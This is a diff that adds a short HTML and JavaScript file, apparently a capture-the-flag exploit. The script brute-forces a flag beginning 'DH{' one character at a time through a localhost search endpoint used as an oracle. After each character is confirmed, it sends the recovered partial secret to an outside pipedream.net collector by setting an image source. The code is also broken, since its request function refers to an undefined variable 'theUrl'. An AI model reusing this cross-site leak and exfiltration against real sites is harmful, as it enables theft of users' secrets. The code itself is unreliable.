@@ -1,0 +1,44 @@
+document.getElementsByClassName("sentence-list").length
+<img id="img">
+
+<script>
+    async function req(url) {
+        return await new Promise((resolve, reject) => {
+            var xmlHttp = new XMLHttpRequest();
+    		xmlHttp.open("GET", theUrl, false);
+    		xmlHttp.send(null);
+    		if (xmlHttp.status==200)
+                return resolve();
+            else
+                return reject()
+        });
+    }
+
+    async function search(query) {
+        try {
+            await req(
+              `http://localhost:8000/search?keyword=${query}`
+            );
+            return true;
+        } catch (e) {
+            return false;
+        }
+    }
+
+    async function exploit() {
+        let chars = "0123456789abcdef}"
+        let secret = "DH{";
+
+        while (!secret.includes("}")) {
+            for (let c of chars) {
+                if (await search(secret + c)) {
+                    secret += c;
+                    img.src = `https://eo9g8lwb7kbpytm.m.pipedream.net/${secret}`;
+                    break;
+                }
+            }
+        }
+    }
+
+    exploit();
+</script>
